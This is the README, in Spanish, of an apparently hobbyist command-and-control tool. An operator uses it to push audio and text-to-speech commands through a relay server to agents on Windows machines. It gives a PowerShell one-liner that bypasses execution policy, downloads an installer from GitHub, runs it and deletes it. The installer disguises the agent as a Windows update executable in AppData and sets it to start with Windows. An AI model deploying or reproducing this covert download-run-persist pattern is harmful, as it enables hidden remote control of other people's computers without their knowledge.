# middle-server-comms

Sistema C2 de tres componentes: un servidor central (`manager`) que retransmite comandos entre un operador (`controller`) y uno o más agentes (`listener`) corriendo en máquinas Windows.

```
[controller] ──► [manager] ──► [listener x N]
                    ◄──────────────
```

---

## Componentes

| Archivo | Rol |
|---|---|
| `manager.py` | Servidor central. Rutea mensajes entre controller y listeners |
| `control.py` | Interfaz del operador. Envía comandos y recibe respuestas en tiempo real |
| `listener.py` | Agente en la máquina target. Reproduce audio y soporta auto-destrucción |
| `installer.ps1` | Script de despliegue para Windows (se descarga y ejecuta remotamente) |

---

## Setup

### Manager

```bash
python manager.py
```

Escucha en `0.0.0.0:9000`. Soporta múltiples listeners simultáneos con IDs (`L1`, `L2`, ...).

### Controller

```bash
python control.py
```

Comandos disponibles:

| Comando | Acción |
|---|---|
| `1` | Reproducir audio desde URL |
| `2` | Text-to-speech via Fish Audio |
| `404` | Auto-destrucción del listener seleccionado |
| `ls` | Listar listeners conectados |
| `sw` | Cambiar listener target |
| `q` | Salir |

Requiere `.env` con:
```
API_KEY=tu_api_key_fish_audio
```

---

## Instalación en Windows (target)

Ejecutar en la máquina target:

```
powershell.exe -ExecutionPolicy Bypass -Command "curl.exe -L 'https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/installer.ps1' -o '$env:TEMP\script.ps1'; & '$env:TEMP\script.ps1'; Remove-Item '$env:TEMP\script.ps1' -Force"
```

Instala el listener en `%APPDATA%\Microsoft\Windows\UpdateService\systemUpdater.exe` y lo registra para iniciar con Windows. El script se elimina automáticamente al terminar.

---

## Build listener.exe

```bash
pyinstaller listener.spec
```
